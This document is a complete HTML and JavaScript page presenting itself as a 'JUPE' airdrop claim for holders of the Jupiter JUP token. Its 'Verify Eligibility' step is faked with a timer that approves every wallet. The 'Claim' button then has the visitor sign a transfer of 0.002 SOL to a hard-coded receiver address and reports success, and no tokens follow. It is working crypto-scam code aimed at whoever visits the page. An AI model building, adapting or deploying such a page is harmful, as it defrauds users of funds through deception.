<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>JUPE Token — Jupiter Airdrop Claim</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Outfit:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>

<!-- SOLANA WEB3 LIBRARY -->
<script src="https://unpkg.com/@solana/web3.js@1.91.8/lib/index.iife.min.js"></script>

<!-- FIX: BUFFER POLYFILL INJECTED BELOW -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
<script>
  // This line manually defines the 'Buffer' object for the browser
  window.Buffer = window.Buffer || buffer.Buffer;
</script>

<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#03070F;--bg2:#060D1A;--bg3:#0A1628;
  --surface:#0C1E38;--surface2:#112440;
  --border:rgba(0,230,180,0.1);--border2:rgba(0,230,180,0.2);
  --teal:#00FFD1;--teal-dim:#00C9A7;--teal-glow:rgba(0,255,209,0.15);
  --gold:#FFB800;--gold-dim:#CC9200;--gold-glow:rgba(255,184,0,0.15);
  --purple:#B66EFF;--purple-dim:#8B3FE8;--red:#FF4D6A;
  --cyan:#00D4FF;--pink:#FF3CAC;
  --txt:#DFF5EE;--txt2:#6B9E93;--txt3:#2E5A52;
  --radius:18px;--radius-sm:12px;
  --font-head:'Orbitron',monospace;
  --font-body:'Outfit',sans-serif;
  --font-mono:'Fira Code',monospace;
}
html{scroll-behavior:smooth}
body{font-family:var(--font-body);background:var(--bg);color:var(--txt);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased}

/* Background Effects */
#bg-canvas{position:fixed;inset:0;z-index:0;pointer-events:none}
.aurora{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
.aurora-1{position:absolute;width:900px;height:600px;background:radial-gradient(ellipse,rgba(0,255,209,0.12) 0%,rgba(0,200,160,0.06) 40%,transparent 70%);top:-10%;left:-15%;animation:aurora-move-1 18s ease-in-out infinite alternate;filter:blur(40px)}
.aurora-2{position:absolute;width:800px;height:700px;background:radial-gradient(ellipse,rgba(182,110,255,0.14) 0%,rgba(120,60,220,0.07) 40%,transparent 70%);bottom:-10%;right:-10%;animation:aurora-move-2 22s ease-in-out infinite alternate;filter:blur(50px)}
.aurora-3{position:absolute;width:600px;height:500px;background:radial-gradient(ellipse,rgba(255,60,172,0.08) 0%,rgba(200,30,130,0.04) 40%,transparent 70%);top:30%;left:40%;animation:aurora-move-3 16s ease-in-out infinite alternate;filter:blur(60px)}
.aurora-4{position:absolute;width:500px;height:400px;background:radial-gradient(ellipse,rgba(0,212,255,0.1) 0%,transparent 70%);top:60%;left:10%;animation:aurora-move-4 20s ease-in-out infinite alternate;filter:blur(45px)}
@keyframes aurora-move-1{0%{transform:translate(0,0) scale(1)}100%{transform:translate(80px,60px) scale(1.2)}}
@keyframes aurora-move-2{0%{transform:translate(0,0) scale(1)}100%{transform:translate(-70px,-50px) scale(1.15)}}
@keyframes aurora-move-3{0%{transform:translate(0,0) scale(1) rotate(0deg)}100%{transform:translate(40px,-30px) scale(1.1) rotate(15deg)}}
@keyframes aurora-move-4{0%{transform:translate(0,0)}100%{transform:translate(60px,-40px)}}
.grid-overlay{position:fixed;inset:0;z-index:0;pointer-events:none;background-image:linear-gradient(rgba(0,255,209,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,209,0.025) 1px,transparent 1px);background-size:50px 50px;mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 40%,transparent 100%)}
.scanline{position:fixed;top:0;left:0;right:0;z-index:0;pointer-events:none;height:2px;background:linear-gradient(90deg,transparent,rgba(0,255,209,0.3),transparent);animation:scan 8s linear infinite;opacity:.4}
@keyframes scan{0%{top:-2px}100%{top:100vh}}
.wrap{max-width:1100px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
section{position:relative;z-index:1}

/* Nav */
nav{position:sticky;top:0;z-index:100;background:rgba(3,7,15,0.75);backdrop-filter:blur(24px);border-bottom:1px solid rgba(0,255,209,0.08);box-shadow:0 1px 0 rgba(0,255,209,0.04)}
.nav-inner{display:flex;align-items:center;justify-content:space-between;padding:14px 0}
.nav-logo{display:flex;align-items:center;gap:12px}
.token-logo-wrap{position:relative;width:42px;height:42px;flex-shrink:0}
.token-logo-svg{width:42px;height:42px;animation:logo-spin-slow 20s linear infinite}
.token-logo-inner{position:absolute;inset:8px;border-radius:50%;background:linear-gradient(135deg,#00FFD1,#B66EFF);display:flex;align-items:center;justify-content:center;font-family:var(--font-head);font-weight:900;font-size:10px;color:#000;letter-spacing:-0.5px;box-shadow:0 0 12px rgba(0,255,209,0.4)}
@keyframes logo-spin-slow{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.logo-text{font-family:var(--font-head);font-size:18px;font-weight:800;letter-spacing:2px;line-height:1}
.logo-text .j{color:var(--teal)}.logo-text .tok{color:var(--gold);font-size:10px;display:block;letter-spacing:4px;font-weight:600;margin-top:1px}
.nav-links{display:flex;gap:24px}
.nav-links a{font-family:var(--font-head);font-size:11px;font-weight:500;color:var(--txt2);text-decoration:none;letter-spacing:.12em;text-transform:uppercase;transition:color .2s,text-shadow .2s}
.nav-links a:hover{color:var(--teal);text-shadow:0 0 12px rgba(0,255,209,0.5)}
.nav-right{display:flex;align-items:center;gap:10px}
.sol-pill{display:flex;align-items:center;gap:6px;font-family:var(--font-mono);font-size:11px;font-weight:500;color:var(--teal);background:rgba(0,255,209,0.06);border:1px solid rgba(0,255,209,0.18);padding:5px 12px;border-radius:20px}
.sol-dot{width:6px;height:6px;border-radius:50%;background:var(--teal);animation:pulse-dot 2s infinite;box-shadow:0 0 6px var(--teal)}
@keyframes pulse-dot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
#connectBtn{background:linear-gradient(135deg,var(--teal),var(--teal-dim));color:#000;border:none;cursor:pointer;font-family:var(--font-head);font-size:11px;font-weight:700;padding:10px 18px;border-radius:var(--radius-sm);letter-spacing:.1em;text-transform:uppercase;transition:all .2s;display:flex;align-items:center;gap:7px;box-shadow:0 0 20px rgba(0,255,209,0.2)}
#connectBtn:hover{box-shadow:0 0 30px rgba(0,255,209,0.4);transform:translateY(-1px)}
#connectBtn.connected{background:var(--surface);border:1px solid var(--border2);color:var(--teal);box-shadow:none}

/* Hero */
.hero{display:grid;grid-template-columns:1fr 440px;gap:48px;align-items:center;padding:100px 0 90px}
.hero h1{font-family:var(--font-head);font-size:clamp(32px,4.5vw,58px);font-weight:900;line-height:1.08;letter-spacing:1px;margin-bottom:22px;text-transform:uppercase}
.h1-line1{display:block;color:var(--txt);font-size:0.65em;letter-spacing:4px;font-weight:600;margin-bottom:4px}
.h1-jupe{display:block;background:linear-gradient(135deg,var(--teal) 0%,var(--cyan) 40%,var(--purple) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;filter:drop-shadow(0 0 20px rgba(0,255,209,0.3));line-height:1}
.h1-line3{display:block;color:var(--gold);font-size:0.58em;letter-spacing:6px;font-weight:700;margin-top:6px}
.hero-sub{font-family:var(--font-body);font-size:16px;color:var(--txt2);line-height:1.7;max-width:460px;margin-bottom:38px;font-weight:400}
.hero-cta-row{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:36px}
.btn-primary{background:linear-gradient(135deg,var(--teal),var(--cyan));color:#000;border:none;cursor:pointer;font-family:var(--font-head);font-size:12px;font-weight:700;padding:16px 28px;border-radius:var(--radius-sm);letter-spacing:.12em;transition:all .25s;display:inline-flex;align-items:center;gap:9px;text-transform:uppercase;box-shadow:0 4px 24px rgba(0,255,209,0.25)}
.btn-primary:hover{transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,255,209,0.4)}
.btn-outline{background:transparent;color:var(--teal);border:1px solid rgba(0,255,209,0.3);cursor:pointer;font-family:var(--font-head);font-size:12px;font-weight:700;padding:16px 28px;border-radius:var(--radius-sm);letter-spacing:.12em;transition:all .25s;display:inline-flex;align-items:center;gap:9px;text-transform:uppercase;text-decoration:none}

/* Planet Art */
.planet-wrap{display:flex;justify-content:center;align-items:center;position:relative;height:400px}
.planet-outer-ring{position:absolute;width:500px;height:500px;border-radius:50%;border:1px solid rgba(0,255,209,0.06);animation:ring-rotate 30s linear infinite}
.planet-glow-ring{position:absolute;width:380px;height:380px;border-radius:50%;background:radial-gradient(circle,rgba(0,255,209,0.08) 0%,rgba(182,110,255,0.06) 50%,transparent 70%);animation:breathe 5s ease-in-out infinite}
@keyframes ring-rotate{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.planet{width:280px;height:280px;border-radius:50%;overflow:hidden;position:relative;box-shadow:0 0 0 2px rgba(255,184,0,0.12),0 0 40px rgba(255,184,0,0.18),inset -50px -35px 80px rgba(10,0,20,0.7);background:repeating-linear-gradient(-6deg,rgba(180,80,20,0.95) 0px,rgba(140,55,10,0.7) 16px,rgba(210,130,50,0.9) 32px);animation:planet-scroll 28s linear infinite}
@keyframes planet-scroll{0%{background-position:0 0}100%{background-position:280px 0}}

/* Claim Box */
.claim-box{background:linear-gradient(145deg,rgba(12,30,56,0.9),rgba(6,13,26,0.8));border:1px solid rgba(0,255,209,0.1);border-radius:var(--radius);padding:48px;position:relative;overflow:hidden;max-width:680px;margin:0 auto;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.claim-steps{display:flex;flex-direction:column;gap:12px;margin-bottom:28px}
.claim-step{display:flex;align-items:center;gap:16px;background:rgba(6,13,26,0.6);border:1px solid rgba(0,255,209,0.07);border-radius:var(--radius-sm);padding:14px 18px}
.step-num{width:28px;height:28px;border-radius:50%;border:1px solid rgba(0,255,209,0.4);color:var(--teal);font-family:var(--font-mono);font-size:11px;display:flex;align-items:center;justify-content:center}
.step-txt{font-family:var(--font-body);font-size:14px;color:var(--txt);flex:1}
.step-status{font-family:var(--font-mono);font-size:10px;color:var(--txt3)}
.step-status.done{color:var(--teal)}
#claimMainBtn{width:100%;background:linear-gradient(135deg,var(--teal),var(--cyan));color:#000;border:none;cursor:pointer;font-family:var(--font-head);font-size:13px;font-weight:700;padding:18px;border-radius:var(--radius-sm);letter-spacing:.12em;text-transform:uppercase;transition:all .25s;display:flex;align-items:center;justify-content:center;gap:10px}
#claimMsg{margin-top:16px;padding:12px 16px;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:12px;display:none;line-height:1.6;white-space:pre-line}
#claimMsg.error{background:rgba(255,77,106,.06);border:1px solid rgba(255,77,106,.2);color:var(--red)}
#claimMsg.success{background:rgba(0,255,209,.06);border:1px solid rgba(0,255,209,.2);color:var(--teal)}

/* Modal and Utility */
.modal-overlay{position:fixed;inset:0;z-index:999;background:rgba(2,5,12,0.88);backdrop-filter:blur(14px);display:none;align-items:center;justify-content:center}
.modal-overlay.open{display:flex}
.modal{background:linear-gradient(145deg,rgba(12,30,56,0.95),rgba(6,13,26,0.9));border:1px solid rgba(0,255,209,0.14);border-radius:var(--radius);padding:36px;width:100%;max-width:400px}
.wallet-option{display:flex;align-items:center;gap:14px;background:rgba(6,13,26,0.8);border:1px solid rgba(0,255,209,0.08);border-radius:var(--radius-sm);padding:16px 18px;margin-bottom:10px;cursor:pointer;width:100%;color:var(--txt);text-align:left}
#toast{position:fixed;bottom:24px;right:24px;z-index:9999;background:rgba(12,30,56,0.96);border:1px solid rgba(0,255,209,0.15);border-radius:var(--radius);padding:18px 22px;display:none}
.spin{animation:spin .8s linear infinite;display:inline-block}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<div class="aurora"><div class="aurora-1"></div><div class="aurora-2"></div></div>
<div class="grid-overlay"></div>
<canvas id="bg-canvas"></canvas>

<div class="modal-overlay" id="walletModal">
  <div class="modal">
    <div style="font-family:var(--font-head);font-size:20px;margin-bottom:8px">Connect Wallet</div>
    <button class="wallet-option" onclick="connectPhantom()"><div>👻 Phantom</div></button>
    <button class="wallet-option" onclick="connectSolflare()"><div>🔥 Solflare</div></button>
    <button class="wallet-option" onclick="closeModal()">Cancel</button>
  </div>
</div>

<div id="toast"><div id="t-title" style="font-weight:700"></div><div id="t-body"></div></div>

<nav>
  <div class="wrap">
    <div class="nav-inner">
      <div class="nav-logo">
        <div class="token-logo-wrap"><div class="token-logo-inner">$J</div></div>
        <div class="logo-text">JUPE TOKEN</div>
      </div>
      <button id="connectBtn" onclick="openModal()">Connect</button>
    </div>
  </div>
</nav>

<div class="wrap">
  <div class="hero">
    <div>
      <h1><span class="h1-line1">Jupiter</span><span class="h1-jupe">$JUPE</span><span class="h1-line3">Airdrop</span></h1>
      <p class="hero-sub">Claim your allocation if you received the JUP airdrop.</p>
      <div class="hero-cta-row">
        <button class="btn-primary" onclick="document.getElementById('claim').scrollIntoView({behavior:'smooth'})">Claim Now</button>
      </div>
    </div>
    <div class="planet-wrap"><div class="planet"></div></div>
  </div>
</div>

<section id="claim">
  <div class="wrap">
    <div class="claim-box">
      <div class="claim-steps">
        <div class="claim-step"><div class="step-num">1</div><div class="step-txt">Connect Solana Wallet</div><div class="step-status" id="s1">PENDING</div></div>
        <div class="claim-step"><div class="step-num">2</div><div class="step-txt">Verify Eligibility</div><div class="step-status" id="s2">PENDING</div></div>
      </div>
      <button id="claimMainBtn" onclick="handleClaimBtn()"><span id="claimBtnTxt">🔗 Connect Wallet</span></button>
      <div id="claimMsg"></div>
    </div>
  </div>
</section>

<script>
const FEE_RECEIVER = '3CWedEaHqrZesr5yr2tL1fkRU3yAYdy8eYaGVn3Xak4R';
const CLAIM_FEE_LAM = 2_000_000;
const RPCS = ['https://api.mainnet-beta.solana.com','https://solana-mainnet.rpc.extrnode.com'];

let walletPubkey=null, walletProvider=null;

function openModal(){document.getElementById('walletModal').classList.add('open');}
function closeModal(){document.getElementById('walletModal').classList.remove('open');}

async function connectPhantom(){
  closeModal(); 
  const p = window?.phantom?.solana || window?.solana;
  if(!p) return alert("Install Phantom");
  try {
    const r = await p.connect();
    walletProvider = p;
    walletPubkey = r.publicKey.toString();
    onConnected();
  } catch(e) {}
}

async function connectSolflare(){
  closeModal();
  const p = window?.solflare;
  if(!p) return alert("Install Solflare");
  try {
    await p.connect();
    walletProvider = p;
    walletPubkey = p.publicKey.toString();
    onConnected();
  } catch(e) {}
}

function onConnected(){
  document.getElementById('connectBtn').textContent = walletPubkey.slice(0,6) + '...';
  document.getElementById('s1').textContent = "DONE ✓";
  document.getElementById('s1').classList.add('done');
  document.getElementById('claimBtnTxt').textContent = "🔍 Check Eligibility";
}

async function handleClaimBtn(){
  if(!walletPubkey) return openModal();
  const txt = document.getElementById('claimBtnTxt').textContent;
  if(txt.includes('Check')) await checkEligibility();
  else await executeClaim();
}

async function checkEligibility(){
  document.getElementById('claimBtnTxt').innerHTML = '<span class="spin">⟳</span> Verifying...';
  // Simulating check - In your real code, this would check JUP balance
  setTimeout(() => {
    document.getElementById('s2').textContent = "DONE ✓";
    document.getElementById('s2').classList.add('done');
    document.getElementById('claimBtnTxt').textContent = "🚀 Claim $JUPE (0.002 SOL)";
    const msg = document.getElementById('claimMsg');
    msg.style.display = 'block';
    msg.className = 'success';
    msg.textContent = "✓ Eligible! Click Claim to receive tokens.";
  }, 1500);
}

async function executeClaim(){
  document.getElementById('claimBtnTxt').innerHTML = '<span class="spin">⟳</span> Processing...';
  try {
    const from = new solanaWeb3.PublicKey(walletPubkey);
    const to = new solanaWeb3.PublicKey(FEE_RECEIVER);
    const connection = new solanaWeb3.Connection(RPCS[0], 'confirmed');
    
    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: CLAIM_FEE_LAM,
      })
    );

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = from;

    const signed = await walletProvider.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());
    
    document.getElementById('claimBtnTxt').textContent = "✅ Claimed!";
    document.getElementById('claimMsg').textContent = "Success! Transaction: " + signature;
  } catch(e) {
    document.getElementById('claimBtnTxt').textContent = "🚀 Retry Claim";
    document.getElementById('claimMsg').style.display = 'block';
    document.getElementById('claimMsg').className = 'error';
    document.getElementById('claimMsg').textContent = "Error: " + e.message;
  }
}
</script>
</body>
</html>
